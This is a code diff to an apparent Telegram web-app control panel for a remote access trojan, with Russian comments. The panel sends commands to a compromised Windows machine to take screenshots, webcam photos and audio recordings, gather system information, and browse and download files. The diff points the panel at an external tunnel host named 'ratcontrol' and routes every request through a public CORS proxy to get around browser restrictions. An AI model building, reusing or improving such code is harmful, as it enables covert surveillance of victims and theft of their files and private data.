@@ -289,7 +289,6 @@
             100%{opacity:1;transform:scale(1)}
         }
         
-        /* Стили для медиатеки */
         .media-section {
             margin: 20px 0;
             padding: 15px;
@@ -380,7 +379,7 @@
 
     <!-- Подключение -->
     <div class="connection-bar">
-        <input type="text" id="serverIP" class="connection-input" placeholder="Адрес сервера" value="localhost:5000">
+        <input type="text" id="serverIP" class="connection-input" placeholder="Адрес сервера" value="ratcontrol.serveousercontent.com">
         <button class="connection-btn" onclick="testConnection()">🔄</button>
     </div>
     <div id="connectionStatus" class="connection-status">⏳ Проверка...</div>
@@ -587,19 +586,20 @@
         tg.expand();
 
         // Настройки
-        let serverAddress = localStorage.getItem('serverAddr') || 'localhost:5000';
+        let serverAddress = localStorage.getItem('serverAddr') || 'ratcontrol.serveousercontent.com';
         let currentDir = 'C:\\';
         document.getElementById('serverIP').value = serverAddress;
 
-        // ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
-        function getBaseUrl() {
-    // Берем адрес из поля ввода
-    let cleanAddress = serverAddress.replace('https://', '').replace('http://', '');
-    // Убираем порт если есть
-    cleanAddress = cleanAddress.split(':')[0];
-    // ВАЖНО: Используем HTTP, не HTTPS!
-    return `http://${cleanAddress}`;
-}
+        // ==================== ПРОКСИ ДЛЯ ОБХОДА CORS ====================
+        const PROXY_URL = 'https://api.allorigins.win/raw?url=';
+
+        function getProxiedUrl(endpoint = '') {
+            let cleanAddress = serverAddress.replace('https://', '').replace('http://', '');
+            cleanAddress = cleanAddress.split(':')[0];
+            const targetUrl = `http://${cleanAddress}${endpoint}`;
+            return PROXY_URL + encodeURIComponent(targetUrl);
+        }
+
         function showStatus(text, type = 'info') {
             console.log(`📢 Статус [${type}]: ${text}`);
             const s = document.getElementById('status');
@@ -611,11 +611,9 @@
 
         async function apiRequest(endpoint, method = 'GET', data = null) {
             try {
-                const baseUrl = getBaseUrl();
-                const url = baseUrl + endpoint;
-                
+                const url = getProxiedUrl(endpoint);
                 console.log('='.repeat(50));
-                console.log('📤 ЗАПРОС К СЕРВЕРУ');
+                console.log('📤 ЗАПРОС К СЕРВЕРУ (через прокси)');
                 console.log('📍 URL:', url);
                 console.log('🔧 Метод:', method);
                 console.log('📦 Данные:', data);
@@ -625,8 +623,7 @@
                     method, 
                     headers: {
                         'Accept': 'application/json'
-                    },
-                    mode: 'cors'
+                    }
                 };
                 
                 if (data) {
@@ -644,7 +641,6 @@
                 }
                 
                 if (endpoint.includes('screenshot') || endpoint.includes('webcam') || endpoint.includes('record_audio')) {
-                    console.log('✅ Получен бинарный файл');
                     return await res.blob();
                 }
                 
@@ -655,7 +651,6 @@
                 console.error('❌ ОШИБКА ЗАПРОСА');
                 console.error('❌ Тип:', e.name);
                 console.error('❌ Сообщение:', e.message);
-                console.error('❌ URL:', getBaseUrl() + endpoint);
                 showStatus(`❌ Ошибка: ${e.message}`, 'error');
                 throw e;
             }
@@ -670,11 +665,8 @@
                     showStatus('✅ OK', 'success');
                     
                     if (cmd === 'system') {
-                        const output = document.getElementById('systemOutput');
-                        const detailOutput = document.getElementById('systemDetailOutput');
-                        const formatted = formatSystem(data.data);
-                        output.innerHTML = formatted;
-                        detailOutput.innerHTML = formatted;
+                        document.getElementById('systemOutput').innerHTML = formatSystem(data.data);
+                        document.getElementById('systemDetailOutput').innerHTML = formatSystem(data.data);
                         updateStats(data.data);
                     } else if (cmd === 'network') {
                         document.getElementById('networkOutput').innerHTML = formatNetwork(data.data);
@@ -828,20 +820,19 @@
             
             try {
                 showStatus('⏳ Проверка соединения...');
-                const res = await fetch(getBaseUrl() + '/');
-                const text = await res.text();
+                const response = await fetch(getProxiedUrl('/'));
                 
-                if (text.includes('✅')) {
-                    document.getElementById('connectionStatus').innerText = '✅ Подключено к серверу';
+                if (response.ok) {
+                    document.getElementById('connectionStatus').innerText = '✅ Подключено';
                     document.getElementById('connectionText').innerText = 'Онлайн';
                     showStatus('✅ Подключено', 'success');
                     sendCommand('system');
                 } else {
-                    throw new Error('Сервер вернул неожиданный ответ');
+                    throw new Error('Сервер не отвечает');
                 }
             } catch (e) {
                 console.error('Ошибка подключения:', e);
-                document.getElementById('connectionStatus').innerText = '❌ Нет соединения с сервером';
+                document.getElementById('connectionStatus').innerText = '❌ Нет соединения';
                 document.getElementById('connectionText').innerText = 'Офлайн';
                 showStatus('❌ Ошибка подключения', 'error');
             }
@@ -944,7 +935,7 @@
         async function downloadFile() {
             const name = document.getElementById('fileName').value;
             if (name) {
-                window.open(getBaseUrl() + '/api/download?path=' + encodeURIComponent(currentDir + '\\' + name), '_blank');
+                window.open(getProxiedUrl('/api/download?path=' + encodeURIComponent(currentDir + '\\' + name)), '_blank');
             }
         }
 
@@ -990,8 +981,6 @@
 
         // ==================== МЕДИАТЕКА ====================
         function showImageInline(url) {
-            console.log('📸 Открываю изображение:', url);
-            
             const modal = document.createElement('div');
             modal.style.cssText = `
                 position: fixed;
@@ -1062,9 +1051,8 @@
                 showImageInline(url);
                 showStatus('✅ Скриншот готов', 'success');
                 setTimeout(() => refreshMedia(), 1000);
-            } catch (e) {
-                console.error('Ошибка скриншота:', e);
-                showStatus('❌ Ошибка скриншота', 'error');
+            } catch { 
+                showStatus('❌ Ошибка', 'error'); 
             }
         }
 
@@ -1076,9 +1064,8 @@
                 showImageInline(url);
                 showStatus('✅ Фото готово', 'success');
                 setTimeout(() => refreshMedia(), 1000);
-            } catch (e) {
-                console.error('Ошибка фото:', e);
-                showStatus('❌ Ошибка фото', 'error');
+            } catch { 
+                showStatus('❌ Ошибка', 'error'); 
             }
         }
 
@@ -1242,7 +1229,3 @@
     </script>
 </body>
 </html>
-
-
-
-
